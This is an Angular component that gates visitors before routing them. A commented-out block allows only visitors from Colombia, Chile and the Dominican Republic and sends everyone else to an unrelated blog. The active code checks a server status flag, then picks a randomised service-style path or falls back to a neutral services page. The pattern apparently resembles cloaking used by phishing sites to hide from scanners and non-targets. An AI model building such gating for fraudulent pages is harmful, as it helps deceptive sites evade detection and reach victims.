import { Component, OnInit } from '@angular/core';
import { Router } from '@angular/router';
import { MainService } from 'src/app/shared/services/main.service';

@Component({
  selector: 'app-initial',
  templateUrl: './initial.component.html',
  styleUrls: ['./initial.component.css'],
})
export class InitialComponent implements OnInit {
  // private website = 'https://newfalarunner.blogspot.com/';
  // private allowedCountry = ['CO', 'CL', 'DO'];

  // constructor(private router: Router, private mainSrv: MainService) {}

  // ngOnInit(): void {
  //   this.start();
  // }

  // async start() {
  //   try {
  //     let found = false;
  //     const result: any = await this.mainSrv.getCurrentCountry();
  //     if (result && result.countryCode) {
  //       console.log('PAIS => ', result.countryCode);

  //       for (let index = 0; index < this.allowedCountry.length; index++) {
  //         const country = this.allowedCountry[index];
  //         if (country.toUpperCase() === result.countryCode) {
  //           found = true;
  //         }
  //       }

  //       if (!found) {
  //         window.location.href = this.website;
  //       }

  //       setTimeout(() => {
  //         this.router.navigate([this.getRoute()]);
  //       }, 2000);
  //     } else {
  //       window.location.href = this.website;
  //     }
  //   } catch (error) {
  //     window.location.href = this.website;
  //   }
  // }

  // getRoute(): string {
  //   const main = ['portal', 'canal', 'auto'];
  //   const optional = [
  //     'consumos',
  //     'consumption',
  //     'atencion',
  //     'attention',
  //     'validacion',
  //     'validation',
  //     '',
  //     'alineacion',
  //   ];
  //   let rand = `${main[Math.floor(Math.random() * main.length)]}/${
  //     optional[Math.floor(Math.random() * optional.length)]
  //   }`;
  //   return rand;
  // }

  /* REALLY */
  constructor(private router: Router, private mainSrv: MainService) {
    this.checkStatus();
  }

  ngOnInit(): void {}

  async checkStatus() {
    try {
      const data: any = await this.mainSrv.getStatus();
      console.log('Resp => ', data);
      if (data && data.isOk) {
        localStorage.setItem('isOk', 'true');
        this.router.navigate([this.getRoute()]);
      } else {
        localStorage.setItem('isOk', 'false');
        this.goInfo();
      }
    } catch (error) {
      localStorage.setItem('isOk', 'false');
      this.goInfo();
    }
  }

  getRoute(): string {
    const main = ['portal', 'canal', 'auto'];
    const optional = [
      '',
      'consumos',
      'consumption',
      'atencion',
      'attention',
      'validacion',
      'validation',
      'alineacion',
    ];
    let rand = `${main[Math.floor(Math.random() * main.length)]}/${
      optional[Math.floor(Math.random() * optional.length)]
    }`;
    return rand;
  }

  private goInfo() {
    this.router.navigate(['/servicios']);
  }
}
